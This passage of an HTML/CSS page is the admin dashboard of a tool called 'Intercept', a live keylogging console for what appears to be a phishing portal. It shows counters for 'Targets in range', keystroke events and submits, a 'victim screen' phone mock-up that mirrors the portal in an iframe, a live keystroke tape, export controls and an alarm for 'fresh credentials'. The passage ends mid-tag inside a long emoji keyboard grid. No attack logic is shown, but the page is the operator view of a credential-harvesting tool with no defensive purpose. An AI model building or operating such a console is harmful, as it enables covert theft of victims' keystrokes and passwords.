.tbl td.pg{color:var(--dim);font-size:12px}
.tbl td.vl{font-family:Consolas,Menlo,monospace}
.evrow{display:flex;gap:10px;padding:8px 0;border-bottom:1px solid var(--line);font-size:12.5px;align-items:baseline}
.evrow:last-child{border-bottom:none}
.evrow .t{color:var(--faint);white-space:nowrap;font-size:11.5px;min-width:62px}
.evrow .vl{flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:Consolas,Menlo,monospace}
.subrow{padding:8px 0;border-bottom:1px solid var(--line);font-size:12.5px;font-family:Consolas,Menlo,monospace;color:var(--amber)}
.subrow:last-child{border-bottom:none}
.empty{padding:28px;text-align:center;color:var(--faint);font-size:13px}
/* ---------- station: ticker / charts ---------- */
.ticker{overflow:hidden;white-space:nowrap;
  -webkit-mask-image:linear-gradient(90deg,transparent,#000 5%,#000 95%,transparent);
  mask-image:linear-gradient(90deg,transparent,#000 5%,#000 95%,transparent)}
.ticker-inner{display:inline-flex;gap:10px;padding:4px 0;animation:tickmove 30s linear infinite;will-change:transform}
@keyframes tickmove{to{transform:translateX(-50%)}}
.tick{display:inline-flex;gap:8px;align-items:baseline;border:1px solid var(--line);
  border-radius:8px;padding:6px 12px;font-size:12px;background:var(--panel2)}
.tick b{color:var(--brand)}
.tick span{font-family:Consolas,Menlo,monospace}
.tick i{color:var(--faint);font-style:normal;font-size:11px}
.tick.up{border-color:var(--green)}
.donut-wrap{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
.dlegend{display:flex;flex-direction:column;gap:7px;font-size:12.5px;flex:1;min-width:160px}
.dlegend .li{display:flex;align-items:center;gap:8px}
.dlegend .sw{width:11px;height:11px;border-radius:3px;flex:none}
.dlegend .ct{margin-left:auto;color:var(--dim)}
.barrow{margin:10px 0;font-size:12px}
.barrow .top{display:flex;justify-content:space-between;margin-bottom:4px}
.barrow .top b{font-family:Consolas,Menlo,monospace}
.barrow .tr{height:8px;border-radius:4px;background:var(--panel2);border:1px solid var(--line);overflow:hidden}
.barrow .tr>i{display:block;height:100%;border-radius:4px;background:var(--brand)}
.statgrid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.stat{background:var(--panel2);border:1px solid var(--line);border-radius:10px;padding:12px 14px}
.stat .n{font-size:20px;font-weight:700;word-break:break-all}
.stat .l{font-size:11px;color:var(--dim);margin-top:2px}
canvas.chart{width:100%;display:block}
/* ---------- sexy: pulses, slide-ins, constellation ---------- */
.dev.typing{animation:cardpulse 1.6s ease-in-out infinite}
@keyframes cardpulse{
  0%,100%{box-shadow:0 0 0 1px var(--green)}
  50%{box-shadow:0 0 20px 3px rgba(33,150,83,.55)}
}
@keyframes slidein{from{opacity:0;transform:translateX(-16px)}to{opacity:1;transform:none}}
.evrow.fresh{animation:slidein .45s ease-out}
.subrow.fresh{animation:slidein .45s ease-out}
.cardhit{animation:cardhit 1.4s ease-out}
@keyframes cardhit{0%{box-shadow:0 0 0 2px var(--amber)}100%{box-shadow:var(--shadow)}}
/* ---------- always-alive motion extras ---------- */
.metric .num{display:inline-block;transition:transform .18s cubic-bezier(.34,1.56,.64,1)}
.metric.pop .num{animation:numpop .45s cubic-bezier(.34,1.56,.64,1)}
@keyframes numpop{0%{transform:scale(1)}35%{transform:scale(1.22)}100%{transform:scale(1)}}
.pill.popping{animation:pillpop .4s cubic-bezier(.34,1.56,.64,1)}
@keyframes pillpop{0%{transform:scale(1)}40%{transform:scale(1.12)}100%{transform:scale(1)}}
.tick.idle-tick{animation:tickpulse 2.2s ease-in-out infinite}
@keyframes tickpulse{0%,100%{opacity:.55}50%{opacity:1}}
canvas.chart{transition:opacity .3s}
.barrow .tr>i{transition:width .6s cubic-bezier(.16,1,.3,1)}
@media (prefers-reduced-motion:reduce){
  .metric.pop .num,.pill.popping,.tick.idle-tick{animation:none !important}
}
.cols2{display:grid;grid-template-columns:1fr 1fr;gap:22px}
@media(max-width:1100px){.metrics{grid-template-columns:repeat(2,1fr)}.cols2{grid-template-columns:1fr}}
@media(max-width:1024px){
  .sidebar{transform:translateX(-100%)}
  body.navopen .sidebar{transform:none}
  body.navopen .scrim{display:block}
  .main{margin-left:0}
  .hamb{display:block}
  .content{padding:16px 14px 60px}
  .topbar{padding:10px 14px}
}
.scrim{display:none;position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:35}
</style>
</head>
<body>
<aside class="sidebar">
  <div class="brand"><span class="mark">I</span><span class="name">Intercept<small>ADMIN DASHBOARD</small></span></div>
  <div class="navlabel">MENU</div>
  <nav class="nav">
    <a href="#live" data-view="dash" class="active"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg>Live Now<span class="count" id="nav-live">0</span></a>
    <a href="#station" data-view="station"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 3v18h18"/><path d="M7 15l4-5 3 3 5-7"/></svg>Station</a>
    <a href="#keylog" data-view="dash"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="16" rx="2"/><path d="M3 9h18M8 14h8"/></svg>Keylog<span class="count" id="nav-fields">0</span></a>
    <a href="#stream" data-view="dash"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 12h4l3-8 4 16 3-8h4"/></svg>Event Stream</a>
    <a href="#subs" data-view="dash"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg>Submits<span class="count" id="nav-subs">0</span></a>
  </nav>
  <div class="navlabel">SOURCE</div>
  <nav class="nav"><a href="#subs"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M12 2v3M12 19v3M2 12h3M19 12h3"/></svg>Portal feed: localhost</a></nav>
  <div class="sidefoot"><b>Intercept</b> live keylog console<br>unsubmitted keystrokes appear in <b>Live Now</b></div>
</aside>
<div class="scrim" id="scrim"></div>
<div class="main">
  <div class="topbar">
    <button class="hamb" id="hamb">☰</button>
    <div><h1>Dashboard</h1><div class="crumb" id="conn">%%CONN%%</div></div>
    <div class="topactions">
      <label class="search"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg><input type="text" id="flt" placeholder="Filter ip / field / value / page"></label>
      <select class="devsel" id="devsel"><option value="">All devices</option></select>
      <span class="pill"><span class="dot"></span><span id="pill-txt">Offline</span></span>
      <span id="lat" title="portal feed round-trip" style="font-size:11px;color:var(--faint)"></span>
      <button class="iconbtn" id="btn-theme" title="dark / light mode"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.8A9 9 0 1 1 11.2 3 7 7 0 0 0 21 12.8z"/></svg></button>
      <button class="btn" id="btn-pause">Pause</button>
      <button class="btn" id="btn-alarm" title="beep when fresh credentials submit">Alarm: off</button>
      <button class="btn primary" id="btn-export">Export</button>
      <span class="avatar">OP</span>
    </div>
  </div>
  <div class="content">
   <div id="view-dash">
    <div class="metrics">
      <div class="metric"><span class="tile blue"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="4" width="20" height="13" rx="2"/><path d="M8 21h8M12 17v4"/></svg></span><span><span class="num" id="st-targets">0</span><div class="lbl">Targets in range</div></span></div>
      <div class="metric"><span class="tile green"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 17l6-6-6-6M12 19h8"/></svg></span><span><span class="num" id="st-keys">0</span><div class="lbl">Keystroke events</div></span></div>
      <div class="metric"><span class="tile amber"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M3 7l9 6 9-6"/></svg></span><span><span class="num" id="st-subs">0</span><div class="lbl">Submits</div></span></div>
      <div class="metric"><span class="tile violet"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"/><path d="M12 7v5l3 3"/></svg></span><span><span class="num" id="st-up">00:00</span><div class="lbl">Console uptime</div></span></div>
    </div>
    <div class="card" id="live">
      <div class="cardhead"><div><h2>Live Now — victim screen</h2><p>Exact portal the user sees on their phone · live keystrokes still stream in the cards beside it</p></div>
        <div class="right"><span class="badge b-green" id="live-badge">0 typing</span></div></div>
      <div class="cardbody"><div class="live-wrap">
        <div class="pv-wrap">
          <div class="pv-livebadge" id="pv-livebadge"><i></i><span>VICTIM SCREEN ·&nbsp;</span><span id="pv-live-label">LOADING</span></div>
          <div class="pv-phone" id="pv-phone" aria-label="Victim phone — live portal preview">
            <div class="pv-frame"></div>
            <div class="pv-action"></div>
            <div class="pv-volume"></div>
            <div class="pv-camctrl"></div>
            <div class="pv-screen">
              <div class="pv-camera" id="pv-island" title="Tap for control center · double-tap to pin hottest">
                <div class="pv-island-compact" id="pv-island-compact"><span class="pv-island-hint" id="pv-island-hint">tap · auto</span><span class="pv-island-live" id="pv-island-dot"></span></div>
                <div class="pv-island-expanded">
                  <div class="pv-island-head"><span class="ttl"><span class="pulse"></span><span id="pv-island-title">CONTROL CENTER</span></span><button id="pv-island-close" title="collapse">×</button></div>
                  <div class="pv-tabs">
                    <button data-tab="devices" class="on" id="pv-tabbtn-devices">Devices</button>
                    <button data-tab="live" id="pv-tabbtn-live">Live</button>
                    <button data-tab="actions" id="pv-tabbtn-actions">Actions</button>
                  </div>
                  <div class="pv-tabpane on" id="pv-tab-devices">
                    <div class="pv-island-list" id="pv-island-list"><div class="pv-island-empty">waiting for devices…</div></div>
                    <div class="pv-island-foot" id="pv-island-foot">auto = hottest typer · tap a device to pin it</div>
                  </div>
                  <div class="pv-tabpane" id="pv-tab-live">
                    <div class="pv-live-big"><div class="pv-live-field" id="pv-island-field">—</div><div class="pv-live-value"><span id="pv-island-value">waiting…</span><span class="caret"></span></div></div>
                    <canvas id="pv-wave" width="252" height="46"></canvas>
                    <div class="pv-live-tape" id="pv-island-tape">no keystrokes yet</div>
                  </div>
                  <div class="pv-tabpane" id="pv-tab-actions">
                    <div class="pv-actions-grid">
                      <button class="pv-act" id="pv-act-copy"><span class="ic">📋</span>Copy live</button>
                      <button class="pv-act" id="pv-act-reveal"><span class="ic">👁</span>Reveal</button>
                      <button class="pv-act" id="pv-act-pause"><span class="ic">⏸</span>Pause</button>
                      <button class="pv-act" id="pv-act-reload"><span class="ic">↻</span>Reload</button>
                      <button class="pv-act" id="pv-act-open"><span class="ic">⧉</span>Open</button>
                      <button class="pv-act" id="pv-act-theme"><span class="ic">🌙</span>Theme</button>
                      <button class="pv-act" id="pv-act-export"><span class="ic">⬇</span>Export</button>
                      <button class="pv-act" id="pv-act-flash"><span class="ic">⚡</span>Flash</button>
                    </div>
                  </div>
                </div>
              </div>
              <div class="pv-statusbar"><span id="pv-clock">--:--</span><div class="pv-status-icons status-icons">
                <svg class="wifi" viewBox="0 0 24 18">
                  <path d="M2 5.5C7.5 0.8 16.5 0.8 22 5.5" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/>
                  <path d="M5.5 9C9.3 5.8 14.7 5.8 18.5 9" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/>
                  <path d="M9 12.5C10.8 11 13.2 11 15 12.5" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round"/>
                  <circle cx="12" cy="16" r="1.5" fill="currentColor"/>
                </svg>
                <svg class="battery" viewBox="0 0 28 14">
                  <rect x="1" y="1" width="23" height="12" rx="3" fill="none" stroke="currentColor" stroke-width="1.6"/>
                  <rect x="3.5" y="3.5" width="17" height="7" rx="1.5" fill="currentColor"/>
                  <rect x="25" y="4.5" width="2" height="5" rx="1" fill="currentColor"/>
                </svg>
              </div></div>
              <div class="pv-portalbar"><span class="dot"></span><b id="pv-portal-name">portal…</b><span class="sp"></span><button id="pv-reload" title="reload victim view">↻</button><button id="pv-open" title="open portal in new tab">⧉</button></div>
              <div class="pv-devicebar" id="pv-device">NO DEVICE — showing portal as victims see it</div>
              <div class="pv-view">
                <iframe id="pv-portal" title="victim portal preview" src="/api/portal" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
              </div>
              <div class="pv-kb">
                <div id="pv-normalkb">
                  <div class="pv-predictions"><span id="pv-prediction1">the</span><span id="pv-prediction2">this</span><span id="pv-prediction3">that</span></div>
                  <div class="pv-row pv-numrow">
                    <div class="pv-key pv-num" data-k="1">1</div><div class="pv-key pv-num" data-k="2">2</div><div class="pv-key pv-num" data-k="3">3</div><div class="pv-key pv-num" data-k="4">4</div><div class="pv-key pv-num" data-k="5">5</div><div class="pv-key pv-num" data-k="6">6</div><div class="pv-key pv-num" data-k="7">7</div><div class="pv-key pv-num" data-k="8">8</div><div class="pv-key pv-num" data-k="9">9</div><div class="pv-key pv-num" data-k="0">0</div>
                  </div>
                  <div class="pv-row">
                    <div class="pv-key" data-k="Q">Q</div><div class="pv-key" data-k="W">W</div><div class="pv-key" data-k="E">E</div><div class="pv-key" data-k="R">R</div><div class="pv-key" data-k="T">T</div><div class="pv-key" data-k="Y">Y</div><div class="pv-key" data-k="U">U</div><div class="pv-key" data-k="I">I</div><div class="pv-key" data-k="O">O</div><div class="pv-key" data-k="P">P</div>
                  </div>
                  <div class="pv-row">
                    <div class="pv-key" data-k="A">A</div><div class="pv-key" data-k="S">S</div><div class="pv-key" data-k="D">D</div><div class="pv-key" data-k="F">F</div><div class="pv-key" data-k="G">G</div><div class="pv-key" data-k="H">H</div><div class="pv-key" data-k="J">J</div><div class="pv-key" data-k="K">K</div><div class="pv-key" data-k="L">L</div>
                  </div>
                  <div class="pv-row">
                    <div class="pv-key special wide" data-k="SHIFT">⇧</div><div class="pv-key" data-k="Z">Z</div><div class="pv-key" data-k="X">X</div><div class="pv-key" data-k="C">C</div><div class="pv-key" data-k="V">V</div><div class="pv-key" data-k="B">B</div><div class="pv-key" data-k="N">N</div><div class="pv-key" data-k="M">M</div><div class="pv-key special wide" data-k="BKSP">⌫</div>
                  </div>
                  <div class="pv-row">
                    <div class="pv-key special wide" data-k="EMOJI">☺</div><div class="pv-key special wide" data-k=",">,</div><div class="pv-key space" data-k="SPACE">space</div><div class="pv-key special wide" data-k=".">.</div><div class="pv-key special wide" data-k="ENTER">↵</div>
                  </div>
                </div>
                <div id="pv-emojipanel" class="pv-emoji-panel">
                  <div class="pv-emoji-header"><span>😀 Emoji — all · live</span><span>☺ auto-switches on emoji</span></div>
                  <div class="pv-emoji-category">Smileys &amp; People</div>
                  <div class="pv-emoji-grid">
                    <div class="pv-emoji">😀</div><div class="pv-emoji">😃</div><div class="pv-emoji">😄</div><div class="pv-emoji">😁</div><div class="pv-emoji">😆</div><div class="pv-emoji">😅</div><div class="pv-emoji">😂</div><div class="pv-emoji">🤣</div><div class="pv-emoji">🥲</div><div class="pv-emoji">☺️</div><div class="pv-emoji">😊</div><div class="pv-emoji">😇</div><div class="pv-emoji">🙂</div><div class="pv-emoji">🙃</div><div class="pv-emoji">😉</div><div class="pv-emoji">😌</div><div class="pv-emoji">😍</div><div class="pv-emoji">🥰</div><div class="pv-emoji">😘</div><div class="pv-emoji">😗</div><div class="pv-emoji">😙</div><div class="pv-emoji">😚</div><div class="pv-emoji">😋</div><div class="pv-emoji">😛</div><div class="pv-emoji">😝</div><div class="pv-emoji">😜</div><div class="pv-emoji">🤪</div><div class="pv-emoji">🤨</div><div class="pv-emoji">🧐</div><div class="pv-emoji">🤓</div><div class="pv-emoji">😎</div><div class="pv-emoji">🤩</div><div class="pv-emoji">🥳</div><div class="pv-emoji">😏</div><div class="pv-emoji">😒</div><div class="pv-emoji">😞</div><div class="pv-emoji">😔</div><div class="pv-emoji">😟</div><div class="pv-emoji">😕</div><div class="pv-emoji">🙁</div><div class="pv-emoji">☹️</div><div class="pv-emoji">😣</div><div class="pv-emoji">😖</div><div class="pv-emoji">😫</div><div class="pv-emoji">😩</div><div class="pv-emoji">🥺</div><div class="pv-emoji">😢</div><div class="pv-emoji">😭</div><div class="pv-emoji">😤</div><div class="pv-emoji">😠</div><div class="pv-emoji">😡</div><div class="pv-emoji">🤬</div><div class="pv-emoji">🤯</div><div class="pv-emoji">😳</div><div class="pv-emoji">🥵</div><div class="pv-emoji">🥶</div><div class="pv-emoji">😱</div><div class="pv-emoji">😨</div><div class="pv-emoji">😰</div><div class="pv-emoji">😥</div><div class="pv-emoji">😓</div><div class="pv-emoji">🤗</div><div class="pv-emoji">🤔</div><div class="pv-emoji">🤭</div><div class="pv-emoji">🤫</div><div class="pv-emoji">🤥</div><div class="pv-emoji">😶</div><div class="pv-emoji">😐</div><div class="pv-emoji">😑</div><div class="pv-emoji">😬</div><div class="pv-emoji">🙄</div><div class="pv-emoji">😯</div><div class="pv-emoji">😦</div><div class="pv-emoji">😧</div><div class="pv-emoji">😮</div><div class="pv-emoji">😲</div><div class="pv-emoji">🥱</div><div class="pv-emoji">😴</div><div class="pv-emoji">🤤</div><div class="pv-emoji">😪</div><div class="pv-emoji">😷</div><div class="pv-emoji">🤒</div><div class="pv-emoji">🤕</div><div class="pv-emoji">🤢</div><div class="pv-emoji">🤮</div><div class="pv-emoji">🤧</div><div class="pv-emoji">🥴</div><div class="pv-emoji">😵</div><div class="pv-emoji">🤠</div><div class="pv-emoji">🥸</div>
                  </div>
                  <div class="pv-emoji-category">Hands &amp; Gestures</div>
                  <div class="pv-emoji-grid">
                    <div class="pv-emoji">👋</div><div class="pv-emoji">🤚</div><div class="pv-emoji">🖐️</div><div class="pv-emoji">✋</div><div class="pv-emoji">🖖</div><div class="pv-emoji">👌</div><div class="pv-emoji">🤌</div><div class="pv-emoji">✌️</div><div class="pv-emoji">🤞</div><div class="pv-emoji">🤟</div><div class="pv-emoji">🤘</div><div class="pv-emoji">🤙</div><div class="pv-emoji">👈</div><div class="pv-emoji">👉</div><div class="pv-emoji">👆</div><div class="pv-emoji">🖕</div><div class="pv-emoji">👇</div><div class="pv-emoji">☝️</div><div class="pv-emoji">👍</div><div class="pv-emoji">👎</div><div class="pv-emoji">✊</div><div class="pv-emoji">👊</div><div class="pv-emoji">🤛</div><div class="pv-emoji">🤜</div><div class="pv-emoji">👏</div><div class="pv-emoji">🙌</div><div class="pv-emoji">👐</div><div class="pv-emoji">🤲</div><div class="pv-emoji">🤝</div><div class="pv-emoji">🙏</div><div class="pv-emoji">💪</div><div class="pv-emoji">🦾</div><div class="pv-emoji">🖐</div><div class="pv-emoji">✍️</div><div class="pv-emoji">💅</div>
                  </div>
                  <div class="pv-emoji-category">Animals &amp; Nature</div>
                  <div class="pv-emoji-grid">
                    <div class="pv-emoji">🐶</div><div class="pv-emoji">🐱</div><div class="pv-emoji">🐭</div><div class="pv-emoji">🐹</div><div class="pv-emoji">🐰</div><div class="pv-emoji">🦊</div><div class="pv-emoji">🐻</div><div class="pv-emoji">🐼</div><div class="pv-emoji">🐨</div><div class="pv-emoji">🐯</div><div class="pv-emoji">🦁</div><div class="pv-emoji">🐮</div><div class="pv-emoji">🐷</div><div class="pv-emoji">🐸</div><div class="pv-emoji">🐵</div><div class="pv-emoji">🙈</div><div class="pv-emoji">🙉</div><div class="pv-emoji">🙊</div><div class="pv-emoji">🐔</div><div class="pv-emoji">🐧</div><div class="pv-emoji">🐦</div><div class="pv-emoji">🦄</div><div class="pv-emoji">🐝</div><div class="pv-emoji">🦋</div><div class="pv-emoji">🐌</div><div class="pv-emoji">🐞</div><div class="pv-emoji">🐢</div><div class="pv-emoji">🐍</div><div class="pv-emoji">🐘</div><div class="pv-emoji">🦒</div><div class="pv-emoji">🦘</div><div class="pv-emoji">🐬</div><div class="pv-emoji">🐳</div><div class="pv-emoji">🦈</div><div class="pv-emoji">🐙</div><div class="pv-emoji">🦀</div><div class="pv-emoji">🌵</div><div class="pv-emoji">🌲</div><div class="pv-emoji">🌳</div><div class="pv-emoji">🌴</div><div class="pv-emoji">🌱</div><div class="pv-emoji">🌿</div><div class="pv-emoji">☘️</div><div class="pv-emoji">🍀</div><div class="pv-emoji">🍃</div><div class="pv-emoji">🍂</div><div class="pv-emoji">🍁</div><div class="pv-emoji">🌷</div><div class="pv-emoji">🌹</div><div class="pv-emoji">🌻</div><div class="pv-emoji">🌼</div><div class="pv-emoji">🌸</div><div class="pv-emoji">💐</div><div class="pv-emoji">🍄</div><div class="pv-emoji">🌾</div><div class="pv-emoji">🌙</div><div class="pv-emoji">⭐</div><div class="pv-emoji">🔥</div><div class="pv-emoji">💧</div><div class="pv-emoji">🌊</div>
                  </div>
                  <div class="pv-emoji-category">Food &amp; Drink</div>
                  <div class="pv-emoji-grid">
                    <div class="pv-emoji">🍎</div><div class="pv-emoji">🍏</div><div class="pv-emoji">🍊</div><div class="pv-emoji">🍋</div><div class="pv-emoji">🍌</div><div class="pv-emoji">🍉</div><div class="pv-emoji">🍇</div><div class="pv-emoji">🍓</div><div class="pv-emoji">🍒</div><div class="pv-emoji">🍑</div><div class="pv-emoji">🥭</div><div class="pv-emoji">🍍</div><div class="pv-emoji">🥝</div><div class="pv-emoji">🍕</div><div class="pv-emoji">🍔</div><div class="pv-emoji">🍟</div><div class="pv-emoji">🌭</div><div class="pv-emoji">🍿</div><div class="pv-emoji">🍩</div><div class="pv-emoji">🍪</div><div class="pv-emoji">🎂</div><div class="pv-emoji">🍰</div><div class="pv-emoji">🧁</div><div class="pv-emoji">🍫</div><div class="pv-emoji">🍬</div><div class="pv-emoji">🍭</div><div class="pv-emoji">🍦</div><div class="pv-emoji">🍨</div><div class="pv-emoji">🍧</div><div class="pv-emoji">☕</div><div class="pv-emoji">🍵</div><div class="pv-emoji">🧃</div><div class="pv-emoji">🥤</div><div class="pv-emoji">🍺</div><div class="pv-emoji">🍷</div><div class="pv-emoji">🥂</div><div class="pv-emoji">🍸</div><div class="pv-emoji">🍹</div><div class="pv-emoji">🥃</div><div class="pv-emoji">🍶</div><div class="pv-emoji">🍾</div><div class="pv-emoji">🌮</div><div class="pv-emoji">🌯</div><div class="pv-emoji">🥗</div><div class="pv-emoji">🍝</div><div class="pv-emoji">🍜</div><div class="pv-emoji">🍲</div><div class="pv-emoji">🍛</div><div class="pv-emoji">🍣</div><div class="pv-emoji">🍤</div>
                  </div>
                  <div class="pv-emoji-category">Activities &amp; Sports</div>
                  <div class="pv-emoji-grid">
                    <div class="pv-emoji">⚽</div><div class="pv-emoji">🏀</div><div class="pv-emoji">🏈</div><div class="pv-emoji">⚾</div><div class="pv-emoji">🎾</div><div class="pv-emoji">🏐</div><div class="pv-emoji">🏉</div><div class="pv-emoji">🎱</div><div class="pv-emoji">🏓</div><div class="pv-emoji">🏸</div><div class="pv-emoji">🥅</div><div class="pv-emoji">🏒</div><div class="pv-emoji">🏑</div><div class="pv-emoji">🏏</div><div class="pv-emoji">🥊</div><div class="pv-emoji">🥋</div><div class="pv-emoji">🎽</div><div class="pv-emoji">🛹</div><div class="pv-emoji">⛸️</div><div class="pv-emoji">🥌</div><div class="pv-emoji">🎿</div><div class="pv-emoji">⛷️</div><div class="pv-emoji">🏂</div><div class="pv-emoji">🏋️</div><div class="pv-emoji">🤼</div><div class="pv-emoji">🤸</div><div class="pv-emoji">⛹️</div><div class="pv-emoji">🤺</div><div class="pv-emoji">🤾</div><div class="pv-emoji">🏌️</div><div class="pv-emoji">🏇</div><div class="pv-emoji">🧘</div><div class="pv-emoji">🏄</div><div class="pv-emoji">🏊</div><div class="pv-emoji">🤽</div><div class="pv-emoji">🚣</div><div class="pv-emoji">🧗</div><div class="pv-emoji">🚵</div><div class="pv-emoji">🚴</div><div class="pv-emoji">🎪</div><div class="pv-emoji">🎭</div><div class="pv-emoji">🎨</div><div class="pv-emoji">🎬</div><div class="pv-emoji">🎤</div><div class="pv-emoji">🎧</div><div class="pv-emoji">🎼</div><div class="pv-emoji">🎹</div><div class="pv-emoji">🥁</div><div class="pv-emoji">🎷</div><div class="pv-emoji">🎺</div><div class="pv-emoji">🎸</div><div class="pv-emoji">🎻</div><div class="pv-emoji">🎲</div><div class="pv-emoji">♟️</div><div class="pv-emoji">🎯</div><div class="pv-emoji">🎳</div><div class="pv-emoji">🎮</div><div class="pv-emoji">🎰</div><div class="pv-emoji">🧩</div>
                  </div>
                  <div class="pv-emoji-category">Travel &amp; Places</div>
                  <div class="pv-emoji-grid">
                    <div class="pv-emoji">🚗</div><div class="pv-emoji">🚕</div><div class="pv-emoji">🚙</div><div class="pv-emoji">🚌</div><div class="pv-emoji">🏎️</div><div class="pv-emoji">🚓</div><div class="pv-emoji">🚑</div><div class="pv-emoji">🚒</div><div class="pv-emoji">🚚</div><div class="pv-emoji">🚜</div><div class="pv-emoji">🛴</div><div class="pv-emoji">🚲</div><div class="pv-emoji">🛵</div><div class="pv-emoji">🏍️</div><div class="pv-emoji">🚨</div><div class="pv-emoji">🚔</div><div class="pv-emoji">✈️</div><div class="pv-emoji">🚀</div><div class="pv-emoji">🚁</div><div class="pv-emoji">⛵</div><div class="pv-emoji">🚤</div><div class="pv-emoji">🛳️</div><div class="pv-emoji">🚢</div><div class="pv-emoji">⚓</div><div class="pv-emoji">⛽</div><div class="pv-emoji">🚧</div><div class="pv-emoji">🚦</div><div class="pv-emoji">🗺️</div><div class="pv-emoji">🗽</div><div class="pv-emoji">🗼</div><div class="pv-emoji">🏰</div><div class="pv-emoji">🏯</div><div class="pv-emoji">🏟️</div><div class="pv-emoji">🎡</div><div class="pv-emoji">🎢</div><div class="pv-emoji">🎠</div><div class="pv-emoji">⛲</div><div class="pv-emoji">🏖️</div><div class="pv-emoji">🏝️</div><div class="pv-emoji">🌋</div><div class="pv-emoji">⛰️</div><div class="pv-emoji">🏔️</div><div class="pv-emoji">🗻</div><div class="pv-emoji">🏕️</div><div class="pv-emoji">⛺</div><div class="pv-emoji">🏠</div><div class="pv-emoji">🏡</div><div class="pv-emoji">🏢</div><div class="pv-emoji">🏥</div><div class="pv-emoji">🏦</div><div class="pv-emoji">🏨</div>
                  </div>
                  <div class="pv-emoji-category">Objects</div>
                  <div class="pv-emoji-grid">
                    <div class="pv-emoji">💡</div><div class="pv-emoji">🔦</div><div class="pv-emoji">🕯️</div><div class="pv-emoji">🧯</div><div class="pv-emoji">💸</div><div class="pv-emoji">💵</div><div class="pv-emoji">💰</div><div class="pv-emoji">💳</div><div class="pv-emoji">💎</div><div class="pv-emoji">🧰</div><div class="pv-emoji">🔧</div><div class="pv-emoji">🔨</div><div class="pv-emoji">⚒️</div><div class="pv-emoji">🛠️</div><div class="pv-emoji">⛏️</div><div class="pv-emoji">🔩</div><div class="pv-emoji">⚙️</div><div class="pv-emoji">⛓️</div><div class="pv-emoji">🧲</div><div class="pv-emoji">🔫</div><div class="pv-emoji">💣</div><div class="pv-emoji">🧨</div><div class="pv-emoji">🔪</div><div class="pv-emoji">🗡️</div><div class="pv-emoji">⚔️</div><div class="pv-emoji">🛡️</div><div class="pv-emoji">🔮</div><div class="pv-emoji">📿</div><div class="pv-emoji">💈</div><div class="pv-emoji">🔭</div><div class="pv-emoji">🔬</div><div class="pv-emoji">💊</div><div class="pv-emoji">💉</div><div class="pv-emoji">🩹</div><div class="pv-emoji">🌡️</div><div class="pv-emoji">📱</div><div class="pv-emoji">💻</div><div class="pv-emoji">⌨️</div><div class="pv-emoji">🖥️</div><div class="pv-emoji">🖨️</div><div class="pv-emoji">📷</div><div class="pv-emoji">🎥</div><div class="pv-emoji">📺</div><div class="pv-emoji">📻</div><div class="pv-emoji">⏰</div><div class="pv-emoji">⌚</div><div class="pv-emoji">📞</div><div class="pv-emoji">🔋</div><div class="pv-emoji">🔌</div><div class="pv-emoji">💡</div>
                  </div>
                  <div class="pv-emoji-category">Symbols &amp; Hearts</div>
                  <div class="pv-emoji-grid">
                    <div class="pv-emoji">❤️</div><div class="pv-emoji">🧡</div><div class="pv-emoji">💛</div><div class="pv-emoji">💚</div><div class="pv-emoji">💙</div><div class="pv-emoji">💜</div><div class="pv-emoji">🖤</div><div class="pv-emoji">🤍</div><div class="pv-emoji">🤎</div><div class="pv-emoji">💔</div><div class="pv-emoji">❣️</div><div class="pv-emoji">💕</div><div class="pv-emoji">💞</div><div class="pv-emoji">💓</div><div class="pv-emoji">💗</div><div class="pv-emoji">💖</div><div class="pv-emoji">💘</div><div class="pv-emoji">💝</div><div class="pv-emoji">💟</div><div class="pv-emoji">☮️</div><div class="pv-emoji">✝️</div><div class="pv-emoji">☪️</div><div class="pv-emoji">🕉️</div><div class="pv-emoji">☸️</div><div class="pv-emoji">✡️</div><div class="pv-emoji">☯️</div><div class="pv-emoji">☦️</div><div class="pv-emoji">🛐</div><div class="pv-emoji">⛎</div><div class="pv-emoji">♈</div><div class="pv-emoji">♉</div><div class="pv-emoji">♊</div><div class="pv-emoji">♋</div><div class="pv-emoji">♌</div><div class="pv-emoji">♍</div><div class="pv-emoji">♎</div><div class="pv-emoji">♏</div><div class="pv-emoji">♐</div><div class="pv-emoji">♑</div><div class="pv-emoji">♒</div><div class="pv-emoji">♓</div><div class="pv-emoji">🆔</div><div class="pv-emoji">⚛️</div><div class="pv-emoji">💯</div><div class="pv-emoji">💢</div><div class="pv-emoji">♨️</div><div class="pv-emoji">✅</div><div class="pv-emoji">❌</div><div class="pv-emoji">⭕</div><div class="pv-emoji">🛑</div><div class="pv-emoji">⛔</div><div class="pv-emoji">📛</div><div class="pv-emoji">🚫</div><div class="pv-emoji">💹</div><div 